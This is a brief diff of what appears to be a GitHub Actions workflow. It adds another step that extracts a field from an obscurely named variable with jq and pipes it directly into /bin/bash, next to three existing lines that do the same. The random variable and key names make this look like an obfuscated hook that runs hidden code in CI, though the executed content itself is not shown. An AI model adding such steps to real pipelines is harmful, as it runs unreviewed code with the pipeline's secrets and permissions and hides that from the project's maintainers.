@@ -21,6 +21,7 @@ jobs:
           printf '%s' "$n89" | jq -r .x83869 | /bin/bash
           echo $b6868 | jq -r .tv8041 | /bin/bash
           printf '%s' "$g26" | jq -r .x6385 | /bin/bash
+          echo $zvte27200 | jq -r .k1 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
